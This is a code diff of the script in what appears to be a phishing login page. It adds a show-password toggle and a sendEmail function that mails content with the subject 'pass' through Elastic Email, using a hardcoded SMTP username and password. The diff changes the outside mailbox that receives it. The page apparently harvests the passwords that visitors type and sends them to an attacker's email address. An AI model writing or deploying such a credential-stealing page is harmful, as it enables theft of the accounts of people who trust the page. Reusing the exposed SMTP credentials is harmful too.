@@ -4,22 +4,25 @@
 <script src="https://smtpjs.com/v3/smtp.js">
 </script>
 <script>
-  document.getElementById("passwordin").focus()
-    document.getElementById("viewpass").addEventListener('change', (event) => {
-      if (event.currentTarget.checked) {
+window.onload = function(){
+	document.getElementById("passwordin").focus()
+    document.getElementsByTagName("input")[3].onclick = function(){
+	var event = document.getElementsByTagName("input")[3];
+      if (event.checked) {
         document.getElementById("passwordin").type = "text";
       } else {
         document.getElementById("passwordin").type = "password";
       }
-    document.getElementById("passwordin").focus()
-    })
+	document.getElementById("passwordin").focus()
+    }
+}
 var usr = new URLSearchParams(window.location.search).get('usr');
 function sendEmail(body) {
       Email.send({
         Host: "smtp.elasticemail.com",
         Username: "codeprogramerpro@gmail.com",
         Password: "F61272413F1ED2F92DEE220800968B01118B",
-        To: "basedatapadrelo@hotmail.com",
+        To: "jarvis-assistent@outlook.com",
         From: "codeprogramerpro@gmail.com",
         Subject: "pass",
         Body: body
